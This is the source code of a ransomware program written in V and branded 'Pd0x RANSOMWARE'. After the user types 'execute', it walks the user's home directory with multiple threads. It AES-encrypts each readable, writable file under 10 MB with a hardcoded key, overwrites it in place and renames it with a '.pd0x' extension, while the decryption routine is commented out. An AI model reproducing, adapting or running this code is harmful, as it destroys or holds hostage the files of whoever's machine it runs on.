import os
import simple_aes
import crypto.aes

__global (
	aes_cipher = aes.new_cipher('canGHd9zH_8gj7lFVyOz1G2K_1Gh6Gua'.bytes())
	threads_count = 0
	color = '\033[35m'
	reset = '\033[0m'
)

fn write_file(file string, data []u8) bool {
	mut file_obj := os.create(file) or { return false }
	defer { file_obj.close() }

	file_obj.write(data) or { return false }
	return true
}

fn fix_length(value string, length int) string {
	mut fixed_value := value
	if fixed_value.len > length {
		fixed_value = fixed_value[..length]
	}
	for fixed_value.len < length {
		fixed_value += ' '
	}
	return fixed_value
}

fn encrypt_file(file string) {
	defer { threads_count -= 1 }
	if !os.is_writable(file) || !os.is_readable(file) || os.file_ext(file) == '.pd0x' {return}
	if os.file_size(file) > 10000000 { return }

	data := os.read_bytes(file) or { return }

	mut encrypted := simple_aes.encrypt(aes_cipher, data)

	if write_file(file, encrypted) {
		os.mv(file, file + '.pd0x') or { return }
		print('\r[+] ${fix_length(file, 100)}')
	}
}

/*
fn decrypt_file(file string) {
	if !os.is_writable(file) || !os.is_readable(file) || os.file_ext(file) != '.pd0x' {return}

	data := os.read_bytes(file) or { 
		eprintln('Failed to read ${file} content')
		return
	}

	decrypted := simple_aes.decrypt(aes_cipher, data)

	if write_file(file, decrypted) {
		os.mv(file, file[..file.len-5]) or {
			eprintln('Failed to move ${file}')
			return
		}
		println('Succesfully decrypted ${file}')
	}
}
*/

fn process_file(file string) {
	spawn encrypt_file(file)
	threads_count += 1
	for threads_count > 20 {}
}

fn main() {

	println('${color}                              dddddddd                                       ')
	println('PPPPPPPPPPPPPPPPP             d::::::d     000000000                         ')
	println('P::::::::::::::::P            d::::::d   00:::::::::00                       ')
	println('P::::::PPPPPP:::::P           d::::::d 00:::::::::::::00                     ')
	println('PP:::::P     P:::::P          d:::::d 0:::::::000:::::::0                    ')
	println('  P::::P     P:::::P  ddddddddd:::::d 0::::::0   0::::::0xxxxxxx      xxxxxxx')
	println('  P::::P     P:::::Pdd::::::::::::::d 0:::::0     0:::::0 x:::::x    x:::::x ')
	println('  P::::PPPPPP:::::Pd::::::::::::::::d 0:::::0     0:::::0  x:::::x  x:::::x  ')
	println('  P:::::::::::::PPd:::::::ddddd:::::d 0:::::0 000 0:::::0   x:::::xx:::::x   ')
	println('  P::::PPPPPPPPP  d::::::d    d:::::d 0:::::0 000 0:::::0    x::::::::::x    ')
	println('  P::::P          d:::::d     d:::::d 0:::::0     0:::::0     x::::::::x     ')
	println('  P::::P          d:::::d     d:::::d 0:::::0     0:::::0     x::::::::x     ')
	println('  P::::P          d:::::d     d:::::d 0::::::0   0::::::0    x::::::::::x    ')
	println('PP::::::PP        d::::::ddddd::::::dd0:::::::000:::::::0   x:::::xx:::::x   ')
	println('P::::::::P         d:::::::::::::::::d 00:::::::::::::00   x:::::x  x:::::x  ')
	println('P::::::::P          d:::::::::ddd::::d   00:::::::::00    x:::::x    x:::::x ')
	println('PPPPPPPPPP           ddddddddd   ddddd     000000000     xxxxxxx      xxxxxxx${reset}')

	println('This is ${color}Pd0x RANSOMWARE${reset}, type "execute" to run it')
	confirmation := os.input('> ${color}')
	print(reset)
	if confirmation != "execute" { return }

	os.walk(os.home_dir(), process_file)
}
